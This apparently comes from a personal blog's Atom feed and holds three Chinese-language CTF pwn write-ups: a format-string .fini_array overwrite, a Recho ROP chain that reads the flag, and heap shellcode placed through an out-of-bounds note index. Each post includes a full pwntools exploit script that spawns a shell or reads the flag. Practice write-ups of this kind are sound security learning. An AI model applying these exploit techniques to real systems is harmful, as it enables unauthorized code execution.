<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://czh11.github.io</id>
    <title>Nono</title>
    <updated>2020-12-01T04:37:57.983Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://czh11.github.io"/>
    <link rel="self" href="https://czh11.github.io/atom.xml"/>
    <subtitle>明天会更好</subtitle>
    <logo>https://czh11.github.io/images/avatar.png</logo>
    <icon>https://czh11.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, Nono</rights>
    <entry>
        <title type="html"><![CDATA[利用格式化字符串漏洞覆盖.fini_array函数]]></title>
        <id>https://czh11.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-fu-gai-fini_array-han-shu/</id>
        <link href="https://czh11.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-fu-gai-fini_array-han-shu/">
        </link>
        <updated>2020-12-01T04:35:46.000Z</updated>
        <content type="html"><![CDATA[<p>攻防世界- greeting-150</p>
<p>检查一下保护</p>
<pre><code>giantbranch@ubuntu:~/Desktop$ checksec greeting-150
[*] '/home/giantbranch/Desktop/greeting-150'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

</code></pre>
<p>看一下函数</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-84h]
  char v5; // [esp+5Ch] [ebp-44h]
  unsigned int v6; // [esp+9Ch] [ebp-4h]

  v6 = __readgsdword(0x14u);
  printf(&quot;Please tell me your name... &quot;);
  if ( !getnline(&amp;v5, 64) )
    return puts(&quot;Don't ignore me ;( &quot;);
  sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);
  return printf(&amp;s);
}
</code></pre>
<pre><code>size_t __cdecl getnline(char *s, int n)
{
  char *v3; // [esp+1Ch] [ebp-Ch]

  fgets(s, n, stdin);
  v3 = strchr(s, 10);
  if ( v3 )
    *v3 = 0;
  return strlen(s);
}
</code></pre>
<p>发现有个格式化字符串漏洞，但是没有循环，</p>
<pre><code>关于.init_array 和.fini_array，也就是构造函数与析构函数

大多数可执行文件是通过链接 libc 来进行编译的，因此 gcc 会将 glibc 初始化代码放入编译好的可执行文件和共享库中。 .init_array和 .fini_array 节（早期版本被称为 .ctors和 .dtors ）中存放了指向初始化代码和终止代码的函数指针。 .init_array 函数指针会在 main() 函数调用之前触发。这就意味着，可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。 .fini_array 函数指针在 main() 函数执行完之后才被触发，在某些场景下这一点会非常有用。例如，特定的堆溢出漏洞（如曾经的 Once upon a free()）会允许攻击者在任意位置写4个字节，攻击者通常会使用一个指向 shellcode 地址的函数指针来重写.fini_array 函数指针。对于大多数病毒或者恶意软件作者来说， .init_array 函数指针是最常被攻击的目标，因为它通常可以使得寄生代码在程序的其他部分执行之前就能够先运行。
</code></pre>
<p>因此这题可以利用格式化字符串漏洞覆盖.fini_array函数，重新执行main函数，同时可以利用格式化字符串漏洞覆盖strlen函数的got表，让其执行system函数。</p>
<pre><code>#!/usr/bin/env python2
#-*-coding: utf-8 -*
from pwn import *
#r=process(&quot;./greeting-150&quot;)
r=remote(&quot;220.249.52.133&quot;,39180)
context.log_level='debug'
r.recvuntil(&quot;Please tell me your name... &quot;)
fini_got=0x08049934
main=0x080485ED
system=0x08048490
strelen=0x8049A54
payload='aa'+p32(strelen+2)+p32(strelen)+p32(fini_got)+'%'+str(0x804-32)+'c%12$hn'
payload+='%'+str(0x8490-0x804)+'c%13$hn'
payload+='%'+str(0x85ED-0x8490)+'c%14$hn'
r.sendline(payload)
r.recvuntil(&quot;Please tell me your name... &quot;)
r.sendline('/bin/sh')
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[pwntools中判断输入是否结束]]></title>
        <id>https://czh11.github.io/post/pwntools-zhong-pan-duan-shu-ru-shi-fou-jie-shu/</id>
        <link href="https://czh11.github.io/post/pwntools-zhong-pan-duan-shu-ru-shi-fou-jie-shu/">
        </link>
        <updated>2020-11-28T06:36:16.000Z</updated>
        <content type="html"><![CDATA[<p>攻防世界-Recho</p>
<p>这题很容易发现是栈溢出，但是如何从while循环中退出来，困扰了很长时间，看来wp才发现pwntools中有一个io.shutdown('send')，帮助输入结束，然后就查看了一下字符串，发现有个flag，接下来就是如何从中读取出flag了，这里用open打开，用read读出，用printf打印出来，open的系统调用号是2，而且alarm是系统调用的函数，通过gdb调试找到syscall的偏移，然后就是构造payload了。</p>
<figure data-type="image" tabindex="1"><img src="https://czh11.github.io/post-images/1606545634031.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://czh11.github.io/post-images/1606545642873.jpg" alt="" loading="lazy"></figure>
<pre><code>#!/usr/bin/env python2
#-*-coding:utf-8 -*
from pwn import *
context.log_level='debug'
r=process(&quot;./Recho&quot;)
r=remote(&quot;220.249.52.133&quot;,38037)
elf=ELF(&quot;./Recho&quot;)
write_plt=elf.plt['write']
read_plt=elf.plt['read']
alarm_plt=elf.plt['alarm']
alarm_got=elf.got['alarm']
printf_plt=elf.plt['printf']
pop_rdi=0x00000000004008a3
pop_rsi=0x00000000004008a1
pop_rdx=0x00000000004006fe
pop_rax=0x00000000004006fc
add_rdi_al=0x000000000040070d
flag=0x0601058
bss=0x0601090
payload='a'*0x38
payload+=p64(pop_rdi)+p64(alarm_got)+p64(pop_rax)+p64(0x5)+p64(add_rdi_al)
payload+=p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(0)+p64(pop_rax)+p64(0x2)+p64(alarm_plt)
payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x500)+p64(0)+p64(pop_rdx)+p64(0x50)+p64(read_plt)
payload+=p64(pop_rdi)+p64(bss+0x500)+p64(printf_plt)
r.recvuntil(&quot;Welcome to Recho server!&quot;)
r.sendline(str(0x200))
payload=payload.ljust(0x200,'\x00')
r.sendline(payload)
r.recv()
r.shutdown('send')
r.interactive()
r.close
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ctfpwn 一道数组越界的堆题]]></title>
        <id>https://czh11.github.io/post/ctfpwn-yi-dao-shu-zu-yue-jie-de-dui-ti/</id>
        <link href="https://czh11.github.io/post/ctfpwn-yi-dao-shu-zu-yue-jie-de-dui-ti/">
        </link>
        <updated>2020-11-19T13:44:23.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<p><img src="https://czh11.github.io/post-images/1605793554457.png" alt="" loading="lazy"><br>
没有限制v1的范围，导致数组的下标可以为任意值，造成数组越界。<br>
<img src="https://czh11.github.io/post-images/1605793729793.jpg" alt="" loading="lazy"><br>
没有开启NX，堆栈可执行，所以可以把shellcode写在堆上，堆申请的大小最大为8，所以要把shellcode写在多个堆块上，</p>
<figure data-type="image" tabindex="1"><img src="https://czh11.github.io/post-images/1605793839389.jpg" alt="" loading="lazy"></figure>
<p>同时写进去的最后一个字节会被置0，因此正真能写的只有7个字节。</p>
<p>综上，我们可以申请任意地址的8个字节改为我们申请的堆块的指针，这里修改got表的内容让它跳转到我们shellcode的地址。</p>
<p>Jmp short xxxx指令占用2字节，这条指令使用的是相对当前指令的下一条指令位置寻址的 。</p>
<figure data-type="image" tabindex="2"><img src="https://czh11.github.io/post-images/1605793857686.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://czh11.github.io/post-images/1605793900510.jpg" alt="" loading="lazy"></figure>
<pre><code>#!/usr/bin/env python2
#-*- coding:utf-8 -*
from pwn import *
p=process(&quot;./note-service2&quot;)
#p=remote(&quot;220.249.52.133&quot;,42490)
elf=ELF(&quot;./note-service2&quot;)
print(hex(elf.got['free']))
context.log_level='debug'
context.arch='amd64'
def add(index,content):
    p.recvuntil('your choice&gt;&gt;')
    p.sendline('1')
    p.recvuntil('index')
    p.sendline(str(index))
    p.recvuntil('size')
    p.sendline(str(8))    
    p.recvuntil('content')
    p.send(content)

def delete(index):
	p.recvuntil('your choice&gt;&gt;')
	p.sendline('4')
	p.recvuntil('index:')
	p.sendline(str(index))

&quot;&quot;&quot;
;64位系统调用
mov rdi,xxxx;&quot;/bin/sh&quot;的地址
mov rax,0x3b;execve系统调用号
mov rsi,0
mov rdx,0
sycall
&quot;&quot;&quot;
gdb.attach(p)
add(0,'/bin/sh')# 向第一个chunk中写入/bin/sh
add((elf.got['free']-0x2020A0)/8,asm('xor rsi,rsi')+'\x90\x90\xeb\x19')
#把got表中free函数的指针覆盖为第二个chunk的指针
#然后在第二个chunk中写入
#xor rsi,rsi
#nop
#nop
#jmp 0x19
add(1,asm('push 0x3b\n pop rax')+'\x90\x90\xeb\x19')
#mov rax,0x3b的机器码站7个字节,而push 0x3b;pop rax只占3个字节
#push 0x3b
#pop rax
#nop
#nop
#jmp 0x19
add(2,asm('xor rdx,rdx')+'\x90\x90\xeb\x19')
#
add(3,asm('syscall')+'\x90'*5)

delete(0)
#因为got表的free函数的地址被修改为我们第二个chunk的地址了,
#所以我们调用free的时候就跳转到了我们第二个chunk的数据段,
#因为这是一个64位程序的函数调用，所以程序会把我们第一个chunk的数据区的指针放入RDI;
#在64位的程序中,当参数少于7个时,参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。

p.interactive()
</code></pre>
]]></content>
    </entry>
</feed>